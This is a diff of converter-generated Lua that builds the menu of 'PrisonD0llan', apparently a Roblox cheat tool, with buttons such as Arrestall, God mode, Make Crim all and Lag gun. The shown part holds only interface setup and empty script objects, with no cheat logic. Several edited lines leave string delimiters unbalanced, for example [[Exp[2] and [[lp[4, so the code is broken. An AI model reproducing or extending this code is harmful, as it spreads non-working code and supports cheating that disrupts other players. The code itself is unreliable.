@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
 ]=]
 
--- Instances: 259 | Scripts: 112 | Modules: 0
+-- Instances: 270 | Scripts: 119 | Modules: 0
 local G2L = {};
 
 -- StarterGui.PrisonD0llan
@@ -75,7 +75,7 @@ G2L["8"] = Instance.new("Frame", G2L["2"]);
 G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["8"]["Size"] = UDim2.new(0, 534, 0, 448);
 G2L["8"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8"]["Position"] = UDim2.new(0, 0, 1.0000008344650269, 0);
+G2L["8"]["Position"] = UDim2.new(0, 0, 1.0526316165924072, 0);
 G2L["8"]["Name"] = [[mainFrame]];
 
 -- StarterGui.PrisonD0llan.Title.mainFrame.Pages
@@ -107,9 +107,9 @@ G2L["c"]["TextSize"] = 14;
 G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["c"]["Size"] = UDim2.new(0, 97, 0, 16);
-G2L["c"]["Name"] = [[Exp[2]]
+G2L["c"]["Name"] = [[Exp[2]
 G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 255, 39);
-G2L["c"]["Text"] = [[Exploits [2]]
+G2L["c"]["Text"] = [[Exploits [2]];
 G2L["c"]["Position"] = UDim2.new(0.19662921130657196, 0, 0, 0);
 
 -- StarterGui.PrisonD0llan.Title.mainFrame.Pages.Exp[2].LocalScript
@@ -123,7 +123,7 @@ G2L["e"]["TextSize"] = 14;
 G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["e"]["Size"] = UDim2.new(0, 97, 0, 16);
-G2L["e"]["Name"] = [[tar[3]];
+G2L["e"]["Name"] = [[tar[3]]
 G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 255, 39);
 G2L["e"]["Text"] = [[Target]];
 G2L["e"]["Position"] = UDim2.new(0.4082396924495697, 0, 0, 0);
@@ -139,7 +139,7 @@ G2L["10"]["TextSize"] = 14;
 G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["10"]["Size"] = UDim2.new(0, 100, 0, 16);
-G2L["10"]["Name"] = [[lp[4]]
+G2L["10"]["Name"] = [[lp[4
 G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 255, 39);
 G2L["10"]["Text"] = [[LocalPlayer/ game]];
 G2L["10"]["Position"] = UDim2.new(0.6104868650436401, 0, 0, 0);
@@ -155,7 +155,7 @@ G2L["12"]["TextSize"] = 14;
 G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["12"]["Size"] = UDim2.new(0, 100, 0, 16);
-G2L["12"]["Name"] = [[config[5]]
+G2L["12"]["Name"] = [[config[5]];
 G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 255, 39);
 G2L["12"]["Text"] = [[Configuration]];
 G2L["12"]["Position"] = UDim2.new(0.812734067440033, 0, 0, 0);
@@ -173,7 +173,7 @@ G2L["14"]["Size"] = UDim2.new(0, 536, 0, 432);
 G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["14"]["Position"] = UDim2.new(-0.00374531839042902, 0, 0.035714250057935715, 0);
 G2L["14"]["Visible"] = false;
-G2L["14"]["Name"] = [[Exploits_page[1]]
+G2L["14"]["Name"] = [[Exploits_page[1]];
 
 -- StarterGui.PrisonD0llan.Title.mainFrame.Exploits_page[1].Humanoid
 G2L["15"] = Instance.new("Frame", G2L["14"]);
@@ -319,7 +319,7 @@ G2L["21"]["TextColor3"] = Color3.fromRGB(5, 255, 0);
 G2L["21"]["Size"] = UDim2.new(0, 55, 0, 29);
 G2L["21"]["Name"] = [[Toggle sit]];
 G2L["21"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
-G2L["21"]["Text"] = [[Toggle bend]];
+G2L["21"]["Text"] = [[Toggle Crawl]];
 G2L["21"]["Position"] = UDim2.new(0.028985507786273956, 0, 0.7372262477874756, 0);
 
 -- StarterGui.PrisonD0llan.Title.mainFrame.Exploits_page[1].Humanoid.Toggle sit.LocalScript
@@ -1109,7 +1109,7 @@ G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["7d"]["Size"] = UDim2.new(0, 492, 0, 24);
 G2L["7d"]["Name"] = [[Arrestall]];
 G2L["7d"]["BorderColor3"] = Color3.fromRGB(9, 0, 255);
-G2L["7d"]["Text"] = [[KeyCard [A loose or dropped access card is required for this button to function.]]
+G2L["7d"]["Text"] = [[KeyCard [A loose or dropped access card is required for this button to function.]];
 G2L["7d"]["Position"] = UDim2.new(0.038520585745573044, 0, 0.6891829967498779, 0);
 
 -- StarterGui.PrisonD0llan.Title.mainFrame.Exploits[2]_page[2].Arrestall.LocalScript
@@ -1826,7 +1826,7 @@ G2L["d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["d3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["d3"]["Size"] = UDim2.new(0, 108, 0, 24);
 G2L["d3"]["BorderColor3"] = Color3.fromRGB(99, 255, 0);
-G2L["d3"]["Text"] = [[Lag gun [Needs gun equipped]];
+G2L["d3"]["Text"] = [[Lag gun [Needs gun equipped]]
 G2L["d3"]["Position"] = UDim2.new(0.41044771671295166, 0, 0.43518519401550293, 0);
 
 -- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
@@ -2033,226 +2033,306 @@ G2L["eb"]["Position"] = UDim2.new(0.026119060814380646, 0, 0.7523148059844971, 0
 G2L["ec"] = Instance.new("LocalScript", G2L["eb"]);
 
 
--- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel
-G2L["ed"] = Instance.new("TextLabel", G2L["8"]);
-G2L["ed"]["BorderSizePixel"] = 0;
-G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["ed"]["TextTransparency"] = 1;
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton
+G2L["ed"] = Instance.new("TextButton", G2L["a5"]);
+G2L["ed"]["TextWrapped"] = true;
+G2L["ed"]["TextScaled"] = true;
+G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["ed"]["TextSize"] = 14;
+G2L["ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["ed"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ed"]["Size"] = UDim2.new(0, 534, 0, 21);
-G2L["ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ed"]["Text"] = [[Welcome To PrisonD0llan]];
-G2L["ed"]["Name"] = [[IntroLabel]];
-G2L["ed"]["BackgroundTransparency"] = 1;
-G2L["ed"]["Position"] = UDim2.new(-0.00187265919521451, 0, 0.0357142873108387, 0);
+G2L["ed"]["Size"] = UDim2.new(0, 62, 0, 24);
+G2L["ed"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ed"]["Text"] = [[God mode]];
+G2L["ed"]["Position"] = UDim2.new(0.7332085371017456, 0, 0.7523148059844971, 0);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.LocalScript
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
 G2L["ee"] = Instance.new("LocalScript", G2L["ed"]);
 
 
--- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits
-G2L["ef"] = Instance.new("TextLabel", G2L["ed"]);
-G2L["ef"]["BorderSizePixel"] = 0;
-G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["ef"]["TextSize"] = 14;
-G2L["ef"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ef"]["Size"] = UDim2.new(0, 21, 0, 21);
-G2L["ef"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ef"]["Text"] = [[By]];
-G2L["ef"]["Name"] = [[Credits]];
-G2L["ef"]["Visible"] = false;
-G2L["ef"]["BackgroundTransparency"] = 1;
-G2L["ef"]["Position"] = UDim2.new(0.4101123511791229, 0, 1, 0);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+G2L["ef"] = Instance.new("LocalScript", G2L["ed"]);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits.Name
-G2L["f0"] = Instance.new("TextLabel", G2L["ef"]);
-G2L["f0"]["BorderSizePixel"] = 0;
-G2L["f0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton
+G2L["f0"] = Instance.new("TextButton", G2L["a5"]);
+G2L["f0"]["TextWrapped"] = true;
+G2L["f0"]["TextScaled"] = true;
+G2L["f0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["f0"]["TextSize"] = 14;
-G2L["f0"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
-G2L["f0"]["Size"] = UDim2.new(0, 84, 0, 21);
-G2L["f0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f0"]["Text"] = [[G0bbyD0llan]];
-G2L["f0"]["Name"] = [[Name]];
-G2L["f0"]["BackgroundTransparency"] = 1;
-G2L["f0"]["Position"] = UDim2.new(0.761904776096344, 0, 0, 0);
+G2L["f0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f0"]["Size"] = UDim2.new(0, 122, 0, 24);
+G2L["f0"]["BorderColor3"] = Color3.fromRGB(99, 255, 0);
+G2L["f0"]["Text"] = [[Auto-shield]];
+G2L["f0"]["Position"] = UDim2.new(0.27238771319389343, 0, 0.7523148059844971, 0);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits.yt
-G2L["f1"] = Instance.new("TextLabel", G2L["ef"]);
-G2L["f1"]["TextWrapped"] = true;
-G2L["f1"]["BorderSizePixel"] = 0;
-G2L["f1"]["TextScaled"] = true;
-G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["f1"]["TextSize"] = 14;
-G2L["f1"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
-G2L["f1"]["Size"] = UDim2.new(0, 171, 0, 47);
-G2L["f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f1"]["Text"] = [[G0bbyD0llan57]];
-G2L["f1"]["Name"] = [[yt]];
-G2L["f1"]["BackgroundTransparency"] = 1;
-G2L["f1"]["Position"] = UDim2.new(-2.4285714626312256, 0, 0.3333333432674408, 0);
-
--- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits.yt.ImageLabel
-G2L["f2"] = Instance.new("ImageLabel", G2L["f1"]);
-G2L["f2"]["BorderSizePixel"] = 0;
-G2L["f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f2"]["Image"] = [[http://www.roblox.com/asset/?id=645664327]];
-G2L["f2"]["Size"] = UDim2.new(0, 41, 0, 42);
-G2L["f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f2"]["BackgroundTransparency"] = 1;
-G2L["f2"]["Position"] = UDim2.new(0.9977192282676697, 0, 0.1025533452630043, 0);
-
--- StarterGui.PrisonD0llan.Title.mainFrame.Test
-G2L["f3"] = Instance.new("TextLabel", G2L["8"]);
-G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["f3"]["TextTransparency"] = 0.5;
-G2L["f3"]["TextSize"] = 14;
-G2L["f3"]["TextColor3"] = Color3.fromRGB(255, 235, 0);
-G2L["f3"]["Size"] = UDim2.new(0, 534, 0, 21);
-G2L["f3"]["BorderColor3"] = Color3.fromRGB(0, 255, 31);
-G2L["f3"]["Text"] = [[Welcome To PrisonD0llan]];
-G2L["f3"]["Name"] = [[Test]];
-G2L["f3"]["Visible"] = false;
-G2L["f3"]["Position"] = UDim2.new(-0.0020000000949949026, 0, 0.4440000057220459, 0);
-
--- StarterGui.PrisonD0llan.Title.mainFrame.Test.LocalScript
-G2L["f4"] = Instance.new("LocalScript", G2L["f3"]);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+G2L["f1"] = Instance.new("LocalScript", G2L["f0"]);
 
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5]
-G2L["f5"] = Instance.new("Frame", G2L["8"]);
-G2L["f5"]["BorderSizePixel"] = 0;
-G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f5"]["BackgroundTransparency"] = 1;
-G2L["f5"]["Size"] = UDim2.new(0, 534, 0, 432);
-G2L["f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f5"]["Position"] = UDim2.new(0, 0, 0.035714320838451385, 0);
-G2L["f5"]["Visible"] = false;
-G2L["f5"]["Name"] = [[Config_page[5]]
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton
+G2L["f2"] = Instance.new("TextButton", G2L["a5"]);
+G2L["f2"]["TextWrapped"] = true;
+G2L["f2"]["TextScaled"] = true;
+G2L["f2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f2"]["TextSize"] = 14;
+G2L["f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f2"]["Size"] = UDim2.new(0, 103, 0, 24);
+G2L["f2"]["BorderColor3"] = Color3.fromRGB(99, 255, 0);
+G2L["f2"]["Text"] = [[Mobille support]];
+G2L["f2"]["Position"] = UDim2.new(0.5167906284332275, 0, 0.7523148059844971, 0);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
-G2L["f6"] = Instance.new("TextButton", G2L["f5"]);
-G2L["f6"]["TextWrapped"] = true;
-G2L["f6"]["TextScaled"] = true;
-G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f6"]["TextSize"] = 14;
-G2L["f6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["f6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f6"]["Size"] = UDim2.new(0, 132, 0, 25);
-G2L["f6"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
-G2L["f6"]["Text"] = [[Change Text title color]];
-G2L["f6"]["Position"] = UDim2.new(0, 0, 0.02777777798473835, 0);
-
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-G2L["f7"] = Instance.new("LocalScript", G2L["f6"]);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+G2L["f3"] = Instance.new("LocalScript", G2L["f2"]);
 
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
-G2L["f8"] = Instance.new("TextButton", G2L["f5"]);
-G2L["f8"]["TextWrapped"] = true;
-G2L["f8"]["TextScaled"] = true;
-G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f8"]["TextSize"] = 14;
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+G2L["f4"] = Instance.new("LocalScript", G2L["f2"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton
+G2L["f5"] = Instance.new("TextButton", G2L["a5"]);
+G2L["f5"]["TextWrapped"] = true;
+G2L["f5"]["TextScaled"] = true;
+G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f5"]["TextSize"] = 14;
+G2L["f5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f5"]["Size"] = UDim2.new(0, 68, 0, 24);
+G2L["f5"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f5"]["Text"] = [[Make Crim all]];
+G2L["f5"]["Position"] = UDim2.new(0.8675369024276733, 0, 0.7523148059844971, 0);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+G2L["f6"] = Instance.new("LocalScript", G2L["f5"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+G2L["f7"] = Instance.new("LocalScript", G2L["f5"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel
+G2L["f8"] = Instance.new("TextLabel", G2L["8"]);
+G2L["f8"]["BorderSizePixel"] = 0;
+G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f8"]["TextTransparency"] = 1;
+G2L["f8"]["TextSize"] = 14;
 G2L["f8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f8"]["Size"] = UDim2.new(0, 132, 0, 25);
-G2L["f8"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
-G2L["f8"]["Text"] = [[Change Border frame color]];
-G2L["f8"]["Position"] = UDim2.new(0.24719101190567017, 0, 0.02777777798473835, 0);
+G2L["f8"]["Size"] = UDim2.new(0, 534, 0, 21);
+G2L["f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f8"]["Text"] = [[Welcome To PrisonD0llan]];
+G2L["f8"]["Name"] = [[IntroLabel]];
+G2L["f8"]["BackgroundTransparency"] = 1;
+G2L["f8"]["Position"] = UDim2.new(-0.00187265919521451, 0, 0.0357142873108387, 0);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
+-- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.LocalScript
 G2L["f9"] = Instance.new("LocalScript", G2L["f8"]);
 
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
-G2L["fa"] = Instance.new("TextButton", G2L["f5"]);
-G2L["fa"]["TextWrapped"] = true;
-G2L["fa"]["TextScaled"] = true;
-G2L["fa"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["fa"]["TextSize"] = 14;
+-- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits
+G2L["fa"] = Instance.new("TextLabel", G2L["f8"]);
+G2L["fa"]["BorderSizePixel"] = 0;
+G2L["fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["fa"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["fa"]["TextSize"] = 14;
 G2L["fa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["fa"]["Size"] = UDim2.new(0, 119, 0, 25);
-G2L["fa"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
-G2L["fa"]["Text"] = [[Change Title border color]];
-G2L["fa"]["Position"] = UDim2.new(0.49438202381134033, 0, 0.02777777798473835, 0);
+G2L["fa"]["Size"] = UDim2.new(0, 21, 0, 21);
+G2L["fa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["fa"]["Text"] = [[By]];
+G2L["fa"]["Name"] = [[Credits]];
+G2L["fa"]["Visible"] = false;
+G2L["fa"]["BackgroundTransparency"] = 1;
+G2L["fa"]["Position"] = UDim2.new(0.4101123511791229, 0, 1, 0);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-G2L["fb"] = Instance.new("LocalScript", G2L["fa"]);
+-- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits.Name
+G2L["fb"] = Instance.new("TextLabel", G2L["fa"]);
+G2L["fb"]["BorderSizePixel"] = 0;
+G2L["fb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["fb"]["TextSize"] = 14;
+G2L["fb"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["fb"]["Size"] = UDim2.new(0, 84, 0, 21);
+G2L["fb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["fb"]["Text"] = [[G0bbyD0llan]];
+G2L["fb"]["Name"] = [[Name]];
+G2L["fb"]["BackgroundTransparency"] = 1;
+G2L["fb"]["Position"] = UDim2.new(0.761904776096344, 0, 0, 0);
 
-
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
-G2L["fc"] = Instance.new("TextButton", G2L["f5"]);
+-- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits.yt
+G2L["fc"] = Instance.new("TextLabel", G2L["fa"]);
 G2L["fc"]["TextWrapped"] = true;
+G2L["fc"]["BorderSizePixel"] = 0;
 G2L["fc"]["TextScaled"] = true;
-G2L["fc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["fc"]["TextSize"] = 14;
+G2L["fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["fc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["fc"]["Size"] = UDim2.new(0, 151, 0, 25);
-G2L["fc"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
-G2L["fc"]["Text"] = [[Change All Pages color]];
-G2L["fc"]["Position"] = UDim2.new(0.7172284722328186, 0, 0.02777777798473835, 0);
+G2L["fc"]["TextSize"] = 14;
+G2L["fc"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
+G2L["fc"]["Size"] = UDim2.new(0, 171, 0, 47);
+G2L["fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["fc"]["Text"] = [[G0bbyD0llan57]];
+G2L["fc"]["Name"] = [[yt]];
+G2L["fc"]["BackgroundTransparency"] = 1;
+G2L["fc"]["Position"] = UDim2.new(-2.4285714626312256, 0, 0.3333333432674408, 0);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-G2L["fd"] = Instance.new("LocalScript", G2L["fc"]);
+-- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.Credits.yt.ImageLabel
+G2L["fd"] = Instance.new("ImageLabel", G2L["fc"]);
+G2L["fd"]["BorderSizePixel"] = 0;
+G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["fd"]["Image"] = [[http://www.roblox.com/asset/?id=645664327]];
+G2L["fd"]["Size"] = UDim2.new(0, 41, 0, 42);
+G2L["fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["fd"]["BackgroundTransparency"] = 1;
+G2L["fd"]["Position"] = UDim2.new(0.9977192282676697, 0, 0.1025533452630043, 0);
 
-
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
-G2L["fe"] = Instance.new("TextButton", G2L["f5"]);
-G2L["fe"]["TextWrapped"] = true;
-G2L["fe"]["TextScaled"] = true;
+-- StarterGui.PrisonD0llan.Title.mainFrame.Test
+G2L["fe"] = Instance.new("TextLabel", G2L["8"]);
 G2L["fe"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["fe"]["TextSize"] = 14;
 G2L["fe"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["fe"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["fe"]["Size"] = UDim2.new(0, 512, 0, 25);
-G2L["fe"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
-G2L["fe"]["Text"] = [[promote your social network in this Script]];
-G2L["fe"]["Position"] = UDim2.new(0.02247191034257412, 0, 0.1041666641831398, 0);
+G2L["fe"]["TextTransparency"] = 0.5;
+G2L["fe"]["TextSize"] = 14;
+G2L["fe"]["TextColor3"] = Color3.fromRGB(255, 235, 0);
+G2L["fe"]["Size"] = UDim2.new(0, 534, 0, 21);
+G2L["fe"]["BorderColor3"] = Color3.fromRGB(0, 255, 31);
+G2L["fe"]["Text"] = [[Welcome To PrisonD0llan]];
+G2L["fe"]["Name"] = [[Test]];
+G2L["fe"]["Visible"] = false;
+G2L["fe"]["Position"] = UDim2.new(-0.0020000000949949026, 0, 0.4440000057220459, 0);
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
+-- StarterGui.PrisonD0llan.Title.mainFrame.Test.LocalScript
 G2L["ff"] = Instance.new("LocalScript", G2L["fe"]);
 
 
--- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextLabel
-G2L["100"] = Instance.new("TextLabel", G2L["f5"]);
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5]
+G2L["100"] = Instance.new("Frame", G2L["8"]);
 G2L["100"]["BorderSizePixel"] = 0;
 G2L["100"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["100"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["100"]["TextSize"] = 14;
-G2L["100"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["100"]["Size"] = UDim2.new(0, 532, 0, 13);
+G2L["100"]["BackgroundTransparency"] = 1;
+G2L["100"]["Size"] = UDim2.new(0, 534, 0, 432);
 G2L["100"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["100"]["Text"] = [[¡Script by G0bbyD0llan57, Follow him on YT!]];
-G2L["100"]["Position"] = UDim2.new(-0.00025545613607391715, 0, 0.9693641662597656, 0);
+G2L["100"]["Position"] = UDim2.new(0, 0, 0.035714320838451385, 0);
+G2L["100"]["Visible"] = false;
+G2L["100"]["Name"] = [[Config_page[5]]
 
 -- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
-G2L["101"] = Instance.new("TextButton", G2L["f5"]);
+G2L["101"] = Instance.new("TextButton", G2L["100"]);
 G2L["101"]["TextWrapped"] = true;
-G2L["101"]["AutoButtonColor"] = false;
 G2L["101"]["TextScaled"] = true;
 G2L["101"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["101"]["TextSize"] = 14;
 G2L["101"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["101"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["101"]["Size"] = UDim2.new(0, 512, 0, 25);
-G2L["101"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
-G2L["101"]["Text"] = [[Current Version = 1.45]];
-G2L["101"]["Position"] = UDim2.new(0.016853932291269302, 0, 0.8842592835426331, 0);
+G2L["101"]["Size"] = UDim2.new(0, 132, 0, 25);
+G2L["101"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
+G2L["101"]["Text"] = [[Change Text title color]];
+G2L["101"]["Position"] = UDim2.new(0, 0, 0.02777777798473835, 0);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
+G2L["102"] = Instance.new("LocalScript", G2L["101"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
+G2L["103"] = Instance.new("TextButton", G2L["100"]);
+G2L["103"]["TextWrapped"] = true;
+G2L["103"]["TextScaled"] = true;
+G2L["103"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["103"]["TextSize"] = 14;
